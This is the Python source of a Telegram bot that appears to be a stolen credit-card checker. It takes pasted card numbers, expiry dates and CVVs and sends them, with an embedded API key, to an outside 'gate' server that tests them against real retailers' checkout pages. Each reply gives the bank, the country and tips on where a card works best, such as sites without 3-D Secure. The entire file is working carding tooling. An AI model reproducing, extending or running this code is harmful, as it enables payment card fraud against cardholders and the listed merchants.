import sys, os, time, random, requests, threading, re, telebot
from urllib.parse import quote
from fake_useragent import UserAgent
from flask import Flask

# --- CONFIG ---
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID", "YOUR_CHAT_ID")
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

@app.route('/')
def health(): return "V30 MASTER ENGINE ACTIVE"

class V30Ultimate:
    def __init__(self):
        self.api_key = "toji_Uymnmw4l1C5BccQE"
        self.gate_base = "http://tojis.site:8080/gatev2"
        self.ua = UserAgent()
        
        # --- ALL 15+ TARGETS INTEGRATED ---
        self.targets = [
            "https://www.tracfone.com/checkout",
            "https://www.skywayluggage.com/checkout",
            "https://us-store.msi.com/checkout",
            "https://www.denon.com/checkout",
            "https://www.oandogadgets.com/checkout",
            "https://www.basicvitamins.com/checkout",
            "https://visual-land.com/checkout",
            "https://hifiheaven.net/checkout",
            "https://support.infinityspeakers.com/hc/en-us",
            "https://www.htd.com/checkout",
            "https://www.polkaudio.com/checkout",
            "https://myprofile.americas.canon.com",
            "https://www.usa.canon.com",
            "https://reolink.com/checkout"
        ]

    def get_full_details(self, cc):
        """BIN API se Country, Bank, aur Level nikalne ke liye"""
        try:
            bin_num = cc[:6]
            res = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=5).json()
            bank = res.get("bank", {}).get("name", "Unknown Bank")
            country = res.get("country", {}).get("name", "Unknown")
            flag = res.get("country", {}).get("emoji", "🌐")
            level = res.get("type", "Unknown").upper()
            scheme = res.get("scheme", "Unknown").upper()
            
            # Smart Usage Logic
            if "UNITED STATES" in country.upper():
                best_use = "🇺🇸 USA Shopping / High-Limit Sites"
            elif "INDIA" in country.upper():
                best_use = "🇮🇳 Domestic / OTP Restricted Sites"
            else:
                best_use = "🌍 International / No-VBV Gateways"
                
            return {
                "bank": bank, "country": f"{country} {flag}", 
                "level": f"{scheme} {level}", "best_use": best_use
            }
        except:
            return {"bank": "Unknown", "country": "Unknown", "level": "Unknown", "best_use": "Check manually"}

    def check_logic(self, cc, message, cmd_name):
        try:
            target_url = random.choice(self.targets)
            final_url = f"{self.gate_base}?cc={cc}&key={self.api_key}&sitye={quote(target_url)}"
            
            resp = requests.get(final_url, headers={'User-Agent': self.ua.random}, timeout=50)
            details = self.get_full_details(cc)
            
            if any(x in resp.text.lower() for x in ["success", "approved", "charged", "succeeded"]):
                status = "✅ **HIT / APPROVED**"
                msg_color = "🟢"
            else:
                status = "❌ **DECLINED**"
                msg_color = "🔴"

            # Final Pro Response
            res_msg = (
                f"{msg_color} **V30 ENGINE RESULT** {msg_color}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"💳 **CC:** `{cc}`\n"
                f"🏦 **Bank:** `{details['bank']}`\n"
                f"🌍 **Country:** `{details['country']}`\n"
                f"💎 **Level:** `{details['level']}`\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"📍 **City/State:** `Auto-Detect (Check BIN)`\n"
                f"🎯 **Best Use:** `{details['best_use']}`\n"
                f"📡 **Status:** {status}\n"
                f"━━━━━━━━━━━━━━━━━━"
            )
            bot.reply_to(message, res_msg, parse_mode="Markdown")
        except:
            bot.reply_to(message, "⚠️ **Gate Error!** Check API connection.")

engine = V30Ultimate()

@bot.message_handler(commands=['chk', 'auth', 'cvv', 'vbv', 'getaway', 'stuts', 'kill', 'bin'])
def handle_commands(message):
    cmd = message.text.split()[0].replace('/', '')
    
    if cmd == 'stuts':
        return bot.reply_to(message, "📊 **Status:** Online\n🎯 **Targets:** 15 Sites Loaded")
    
    if cmd == 'kill':
        bot.reply_to(message, "💀 Engine Killed.")
        os._exit(0)

    try:
        cc_list = re.findall(r'\d+', message.text)
        if len(cc_list) < 3:
            return bot.reply_to(message, "❌ **Usage:** `/chk card|mm|yy|cvv`")
        
        full_cc = "|".join(cc_list[:4])
        bot.send_chat_action(message.chat.id, 'typing')
        engine.check_logic(full_cc, message, cmd)
    except: pass

@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, "👑 **V30 MASTER ENGINE IS LIVE**\nPaste CC to get Bank, Country and Status.")

if __name__ == "__main__":
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000))), daemon=True).start()
    bot.infinity_polling()
